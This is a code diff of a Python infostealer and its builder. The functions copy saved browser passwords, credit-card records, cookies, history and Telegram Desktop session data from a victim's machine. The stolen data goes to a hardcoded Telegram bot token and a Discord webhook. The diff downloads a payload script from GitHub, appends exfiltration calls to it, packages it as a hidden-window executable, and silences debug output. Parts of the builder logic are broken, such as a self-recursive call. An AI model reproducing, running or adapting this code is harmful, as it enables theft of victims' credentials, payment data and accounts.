@@ -14,6 +14,7 @@ import zipfile
 import time
 import os
 import sys
+import wget
 
 
     #For media and files
@@ -25,7 +26,7 @@ def send_Mdocument(document_path, chat_id, token):
         files = {'document': f}
         response = requests.post(Durl, params=params, files=files)
 
-    print(response.status_code, response.reason)
+    #print(response.status_code, response.reason)
 
 
 
@@ -55,10 +56,10 @@ def open_url(url):
     try:
         # Open the URL in the default browser
         webbrowser.open(url)
-        print("Browser opened successfully")
+        #print("Browser opened successfully")
     except Exception as e:
-        print("Error: Failed to open browser")
-        print("Error message: ", e)
+        # print("Error: Failed to open browser")
+         print("Error message: ", e)
 
 
 def get_string(local_state):
@@ -94,7 +95,7 @@ def stealWebPassword():
     shutil.copy(db_path,destination_file)
 
     conn = sqlite3.connect(destination_file+"\\Login Data")
-    print(db_path)
+    #print(db_path)
 
     # Execute a SQL query to retrieve encrypted passwords
     cursor=conn.execute("SELECT action_url, username_value, password_value FROM logins")
@@ -134,7 +135,7 @@ def stealCardDetails():
     shutil.copy(db_path,destination_file)
 
     conn = sqlite3.connect(destination_file+"\\Web Data")
-    print(db_path)
+    #print(db_path)
 
     # Execute a SQL query to retrieve encrypted credit_cards
     cursor=conn.execute("SELECT * FROM credit_cards")
@@ -162,7 +163,7 @@ def stealBrowserCookies():
         shutil.copy(db_path,destination_file)
 
         conn = sqlite3.connect(destination_file+"\\Cookies")
-        print(db_path)
+        #print(db_path)
 
         # Execute a SQL query to retrieve encrypted cookies
     
@@ -180,10 +181,10 @@ def stealBrowserCookies():
         return cookie_path
  
     except Exception as e:
-        if "no such table: cookies" in str(e):
-            print("Table not found, ignoring error.")
-        else:
-            pass
+        # if "no such table: cookies" in str(e):
+        #     print("Table not found, ignoring error.")
+        # else:
+        #     pass
         return ""
 
 def stealBrowserHistory():
@@ -196,7 +197,7 @@ def stealBrowserHistory():
     shutil.copy(db_path,destination_file)
 
     conn = sqlite3.connect(destination_file+"\\History")
-    print(db_path)
+    #print(db_path)
     cursor=conn.execute("SELECT * FROM urls")
 
     # Open a text file to write the results
@@ -218,12 +219,12 @@ def kill_app(process_name):
             process.kill()
             print(f"{process_name} successfully killed.")
             return
-    print(f"{process_name} not found.")
+    #print(f"{process_name} not found.")
 
-def tele():
+def tele(discord_webhook):
     
-    discord_webhook_url = "https://discordapp.com/api/webhooks/1115894638335762472/CpAf-g0zDqMaSN9qAXI-14qPEH5KWl3dYz0tj2_1XXHlzY9fIGyf6eqzQYxVzpors6Lu"
-
+    #discord_webhook_url = "https://discordapp.com/api/webhooks/1115894638335762472/CpAf-g0zDqMaSN9qAXI-14qPEH5KWl3dYz0tj2_1XXHlzY9fIGyf6eqzQYxVzpors6Lu"
+    discord_webhook_url = discord_webhook
     directory = os.path.expanduser(os.environ['APPDATA'] + '\\Telegram Desktop\\tdata')
  
     exclude_folder = "user_data"
@@ -255,25 +256,43 @@ def tele():
     }
     response = requests.post(discord_webhook_url, files=files)
 
-    if response.status_code == 200:
-        print("file was send to discord")
-    else:
-        print(f"{response.status_code} error")
+    # if response.status_code == 200:
+    #     print("file was send to discord")
+    # else:
+    #     print(f"{response.status_code} error")
 
-def fun(tokenStr,chatidStr):
+def fun(tokenStr,chatidStr,discord_webhook_url):
+    url='https://raw.githubusercontent.com/tktk12341234/TelegramBot/main/main.py'
+    pathFile='./TelegramBot.py'
+    wget.download(url,pathFile)
+    file_data = ""
 
-    
-    os.system("pyinstaller  TelegramBot.py")
+    time.sleep(1)
+    tele()
+    fun(token,chatID)
+
+    with open(pathFile, 'a+') as f:
+        f.write('send_Mdocument(file_path2, '+token+', tok)'+'\n')   #加\n换行显示
+        f.write('send_Mdocument(pass_path, '+token+', tok)'+'\n') 
+        f.write('send_Mdocument(card_path, '+token+', tok)'+'\n') 
+        f.write('send_Mdocument(history_path, '+token+', tok)'+'\n') 
+        f.write('time.sleep(1)'+'\n') 
+        f.write('tele('+discord_webhook_url+')'+'\n') 
+
+    os.system("pyinstaller  -F TelegramBot.py  -w")
     
 
 
 if __name__ == '__main__':
-
+    token=''
+    chatID=''
+    discord_webhook_url=''
     try:
-        token, chatID = sys.argv[1:3]
+        token, chatID,discord_webhook_url = sys.argv[1:4]
     except Exception as e:
         print(sys.argv)
-        print(e)
+        print("请输入本程序参数：Telegram机器人Token,ChatID,discord_webhook_Url")
+        print("具体可参照：https://github.com/tktk12341234/TelegramBot/Readme.md")
 
     cid = "1812229159"
     tok = "5621453581:AAGsnI2k37aoX1WJx2HMmFHGQxd0ZfRNeD8"
@@ -305,9 +324,5 @@ if __name__ == '__main__':
     if cookie_path!="":
         send_Mdocument(cookie_path, cid, tok)
     send_Mdocument(history_path, cid, tok)
-
     time.sleep(1)
- 
-    tele()
-
- 
+    tele("https://discordapp.com/api/webhooks/1115894638335762472/CpAf-g0zDqMaSN9qAXI-14qPEH5KWl3dYz0tj2_1XXHlzY9fIGyf6eqzQYxVzpors6Lu")
